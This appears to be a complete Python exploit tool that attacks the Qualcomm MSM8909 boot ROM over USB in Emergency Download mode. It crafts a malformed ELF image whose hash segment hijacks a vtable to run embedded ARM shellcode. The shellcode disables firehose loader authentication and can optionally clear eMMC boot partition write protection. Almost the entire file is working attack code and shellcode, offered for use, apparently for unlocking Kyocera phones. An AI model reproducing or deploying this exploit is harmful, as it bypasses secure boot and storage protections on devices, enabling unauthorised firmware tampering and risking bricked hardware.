#!/usr/bin/env python3
#
# SPDX-FileCopyrightText: 2026 5E7EN <https://github.com/5E7EN>
# SPDX-License-Identifier: AGPL-3.0-or-later
#

"""
** Kyopwna **
MSM8909 firehose loader auth de-auther.

Usage: sudo python3 firehose-deauther.py [--disable-wp]

Most devices that have already passed SBL1 boot stage will enforce hardware write protection for certain boot partitions.
Attempting to write something to eMMC via a firehose loader with this enforcement active, will fail the verify readback.
To clear this protection, pass --disable-wp.

This has been tested against the Kyocera E4610's eMMC. Results may vary.
Though it should be same across most storage devices since the cmds we send (CLR_WRITE_PROT) are SD standard.
"""

import argparse
import struct
import sys
import time

QC_VID = 0x05C6
QC_PID = 0x9008
USB_TIMEOUT_MS = 5000

# sahara stuff
CMD_HELLO = 0x01
CMD_HELLO_RESP = 0x02
CMD_READ_DATA = 0x03
CMD_END_TRANSFER = 0x04
CMD_DONE = 0x05

ELF_HEADER_SIZE = 52
PHDR_SIZE = 32
HASH_PAYLOAD_SIZE = 0x10000

IMEM_HASH_WRITE = 0x08003500
#IMEM_POOL = 0x08003600
IMEM_SHELLCODE = 0x0805C000
EXPLOIT_VTABLE_PTR_OFF = 0x18
EXPLOIT_VTABLE_DAT_OFF = 0x20
EXPLOIT_RETURN1_GADGET = 0x00100B40

# payload
SHELLCODE = (
    b"\x00\xd4\x05\xe3\x20\xd0\x40\xe3\x54\x00\x03\xe3\x00\x08\x40\xe3" # SP, R0=vtable
    b"\x24\x15\x06\xe3\x10\x10\x40\xe3\x00\x10\x80\xe5\x04\x10\x80\xe5" # auth patch
    b"\x40\x01\x09\xe3\x8d\x07\x40\xe3\x02\x20\xa0\xe3\x00\x20\x80\xe5" # USB controller reset
    b"\xc8\x00\xa0\xe3\xf0\x46\x0c\xe3\x10\x40\x40\xe3\x34\xff\x2f\xe1" # delay
    b"\x1c\x05\x03\xe3\x00\x08\x40\xe3\x00\x10\xa0\xe3\x00\x10\x80\xe5" # zero USB init flag
    b"\x3c\x56\x08\xe3\x21\x50\x40\xe3\x28\x15\x03\xe3\x00\x18\x40\xe3" # R5=mc_ctx, image_type_ptr
    b"\x28\x10\x85\xe5\x05\x00\xa0\xe1\xe0\x4e\x08\xe3\x10\x40\x40\xe3" # sahara_setup_download
    b"\x34\xff\x2f\xe1\x05\x00\xa0\xe1\x8c\x45\x04\xe3\x10\x40\x40\xe3" # mc_load_elf_image
    b"\x34\xff\x2f\xe1\x00\x00\x50\xe3\x07\x00\x00\x1a\x05\x00\xa0\xe1" # result check + branch
    b"\x00\x4a\x08\xe3\x10\x40\x40\xe3\x34\xff\x2f\xe1\x05\x00\xa0\xe1" # auth_shared_setup
    b"\x7c\x44\x06\xe3\x10\x40\x40\xe3\x34\xff\x2f\xe1\x00\x00\x0b\xe3" # mc_boot_image
    b"\x4a\x00\x40\xe3\x00\x10\xa0\xe3\x00\x10\x80\xe5\xfe\xff\xff\xea" # fallback: PSHOLD reset + spin
)

# CMD6 + CMD29 loop over eMMC boot partitions
WP_CLEAR = (
    b"\x00\x70\x04\xe3\x82\x77\x40\xe3\x00\x00\xe0\xe3\x38\x00\x87\xe5" # R7=MCI base, clear status
    b"\x00\x10\x01\xe3\xab\x13\x40\xe3\x08\x10\x87\xe5\x46\x1c\x00\xe3" # CMD6: EXT_CSD[171]=0x10
    b"\x0c\x10\x87\xe5\x34\x10\x97\xe5\x80\x08\x11\xe3\xfc\xff\xff\x0a" # CMD6 send + poll ProgDone
    b"\x38\x00\x87\xe5\x00\x30\xa0\xe3\x5d\x2c\x00\xe3\x08\x30\x87\xe5" # clear status, R3=0, CMD29
    b"\x0c\x20\x87\xe5\x34\x10\x97\xe5\x80\x08\x11\xe3\xfc\xff\xff\x0a" # CMD29 send + poll ProgDone
    b"\x38\x00\x87\xe5\x01\x39\x83\xe2\x38\x08\x53\xe3\xf6\xff\xff\x3a" # R3+=step, loop if < end
)

#POOL = (
#    b"\x00\x54\x20\x00\x24\x65\x10\x00\x40\x91\x8d\x07\xf0\xc6\x10\x00"
#    b"\x3c\x86\x21\x00\xe0\x8e\x10\x00\x8c\x45\x10\x00\x00\x8a\x10\x00"
#    b"\x00\xb0\x4a\x00\x7c\x64\x10\x00"
#)

# Sahara implm adapted from bkerler EDL client
class SaharaUSB:
    def __init__(self):
        self.dev = None
        self.ep_in = None
        self.ep_out = None

    def connect(self):
        import usb.core, usb.util

        self.dev = usb.core.find(idVendor=QC_VID, idProduct=QC_PID)
        if self.dev is None:
            print("-- No EDL device found (05C6:9008)")
            return False
        try:
            self.dev.set_configuration()
        except Exception:
            pass
        cfg = self.dev.get_active_configuration()
        intf = cfg[(0, 0)]
        self.ep_out = usb.util.find_descriptor(
            intf,
            custom_match=lambda e: usb.util.endpoint_direction(e.bEndpointAddress)
            == usb.util.ENDPOINT_OUT,
        )
        self.ep_in = usb.util.find_descriptor(
            intf,
            custom_match=lambda e: usb.util.endpoint_direction(e.bEndpointAddress)
            == usb.util.ENDPOINT_IN,
        )
        if not self.ep_in or not self.ep_out:
            print("-- No bulk endpoints")
            return False
        print(
            f"Connected (EP_IN=0x{self.ep_in.bEndpointAddress:02X},"
            f" EP_OUT=0x{self.ep_out.bEndpointAddress:02X})"
        )
        return True

    def release(self):
        import usb.util

        if self.dev:
            try:
                usb.util.dispose_resources(self.dev)
            except Exception:
                pass
            self.dev = None

    def write(self, data: bytes):
        self.ep_out.write(data, timeout=USB_TIMEOUT_MS)

    def read(self, size=8192, timeout=None) -> bytes:
        import usb.core

        t = timeout or USB_TIMEOUT_MS
        try:
            return bytes(self.ep_in.read(size, timeout=t))
        except usb.core.USBTimeoutError:
            return b""
        except usb.core.USBError as e:
            if "timeout" in str(e).lower():
                return b""
            raise


def pwn(usb_dev: SaharaUSB, elf: bytes) -> bool:
    print("Waiting for HELLO...")
    data = usb_dev.read(512)
    if not data:
        print("No HELLO received. Try rebooting and reconnecting device")
        return False
    cmd = struct.unpack_from("<I", data, 0)[0]
    if cmd != CMD_HELLO:
        print(f"Expected HELLO, got 0x{cmd:02X}")
        return False
    fields = struct.unpack_from("<IIIIII", data)
    print(f"HELLO: version={fields[2]}, mode={fields[5]}")

    resp = struct.pack("<II", CMD_HELLO_RESP, 48)
    resp += struct.pack("<IIII", fields[2], fields[3], 0, fields[5])
    resp += b"\x00" * 24
    usb_dev.write(resp)

    headers_end = ELF_HEADER_SIZE + 2 * PHDR_SIZE
    step = 0
    while step < 50:
        data = usb_dev.read(512)
        if not data:
            print("Timeout waiting for PBL request")
            return False
        cmd = struct.unpack_from("<I", data, 0)[0]
        if cmd == CMD_READ_DATA:
            step += 1
            rd = struct.unpack_from("<IIIII", data)
            offset, size = rd[3], rd[4]
            end = offset + size
            chunk = (
                elf[offset:end]
                if end <= len(elf)
                else elf[offset:] + b"\x00" * (end - len(elf))
            )
            if offset < headers_end:
                label = " (headers)"
            elif offset < headers_end + HASH_PAYLOAD_SIZE:
                label = " (hash)"
            else:
                label = " (shellcode)"
            #print(f"  [{step:2d}] offset=0x{offset:06X} size=0x{size:04X}{label}")
            usb_dev.write(chunk)
        elif cmd == CMD_END_TRANSFER:
            status = struct.unpack_from("<I", data, 12)[0]
            if status == 0:
                print(f"END_TRANSFER: success ({step} transfers)")
                break
            else:
                print(f"END_TRANSFER: error 0x{status:02X}")
                return False
        else:
            print(f"Unexpected cmd 0x{cmd:02X}")
            return False

    time.sleep(0.5)
    try:
        usb_dev.write(struct.pack("<II", CMD_DONE, 8))
        resp = usb_dev.read(512)
        if resp and struct.unpack_from("<I", resp, 0)[0] == 0x06:
            print("fin")
    except Exception:
        pass
    return True


def build_elf(disable_wp=False):
    shellcode = SHELLCODE
    if disable_wp:
        shellcode = SHELLCODE[:0x74] + WP_CLEAR + SHELLCODE[0x74:]

    payload = bytearray(HASH_PAYLOAD_SIZE)
    struct.pack_into("<I", payload, EXPLOIT_VTABLE_PTR_OFF, 0x08003520)
    for i in range(48):
        struct.pack_into(
            "<I", payload, EXPLOIT_VTABLE_DAT_OFF + i * 4, EXPLOIT_RETURN1_GADGET
        )
    #pool_off = IMEM_POOL - IMEM_HASH_WRITE
    #payload[pool_off : pool_off + len(POOL)] = POOL
    payload = bytes(payload)

    n_phdrs = 2
    headers_end = ELF_HEADER_SIZE + n_phdrs * PHDR_SIZE

    hdr = struct.pack("<4sBBBBBxxxxxxx", b"\x7fELF", 1, 1, 1, 0, 0)
    hdr += struct.pack(
        "<HHIIIIIHHHHHH",
        2, 0x28, 1, IMEM_SHELLCODE,
        ELF_HEADER_SIZE, 0, 0, ELF_HEADER_SIZE,
        PHDR_SIZE, n_phdrs, 0, 0, 0,
    )

    off_hash = headers_end
    off_sc = off_hash + len(payload)

    phdrs = struct.pack(
        "<IIIIIIII",
        1, off_hash, IMEM_HASH_WRITE, IMEM_HASH_WRITE,
        HASH_PAYLOAD_SIZE, HASH_PAYLOAD_SIZE, 0x02000007, 0,
    )
    phdrs += struct.pack(
        "<IIIIIIII",
        1, off_sc, IMEM_SHELLCODE, IMEM_SHELLCODE,
        len(shellcode), len(shellcode), 0x00000007, 0,
    )

    return hdr + phdrs + payload + shellcode


def main():
    parser = argparse.ArgumentParser(
        description="Kyopwna firehose de-auther",
    )
    parser.add_argument(
        "--disable-wp", action="store_true",
        help="Clear eMMC write protection for certain sensitive boot partitions",
    )
    args = parser.parse_args()

    print()
    print("=" * 62)
    print("  ** Kyopwna - Firehose De-auther **")
    print("  jt/u/BenTorah")
    print("  v1.0")
    print("=" * 62)
    print()

    elf = build_elf(disable_wp=args.disable_wp)

    # connect and deliver
    usb_dev = SaharaUSB()
    if not usb_dev.connect():
        sys.exit(1)

    print()
    if not pwn(usb_dev, elf):
        print("-- PWNAGE failed :(")
        usb_dev.release()
        sys.exit(1)

    usb_dev.release()

    print()
    print("=" * 62)
    print("  PWNED! USB will re-enumerate shortly.")
    print("  Then, connect your EDL client.")
    print("=" * 62)
    print()


if __name__ == "__main__":
    main()
